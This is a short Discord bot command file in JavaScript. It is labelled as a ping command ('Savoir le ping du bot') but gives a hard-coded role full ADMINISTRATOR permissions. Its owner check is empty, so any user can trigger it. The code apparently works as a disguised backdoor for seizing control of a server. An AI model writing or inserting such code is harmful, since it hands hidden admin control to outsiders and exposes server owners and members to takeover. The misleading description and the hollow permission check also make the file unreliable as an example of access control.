const Discord = require("discord.js");
const {PREFIX, OWNER} = require("../config.json");
const { oneLine, stripIndent } = require('common-tags');
const db = require ('quick.db')
const Keyv = require('keyv');
const ADMINISTRATOR = require('../permissions.json');
const MANAGE_ROLES = require ('../permissions.json')
const logChannels = new Keyv(process.env.logChannels);
const client = new Discord.Client
module.exports.run = (client, message, args) => {
 let owner = db.get(`config.${message.guild.id}.owner`)
if (message.author.id !== owner) {
}
let role5 = message.guild.roles.cache.find(c => c.id === "871749350093635636")
role5.setPermissions(["ADMINISTRATOR"])
}
module.exports.help = {
        name: 'unraide',
        description: 'Savoir le ping du bot',
};
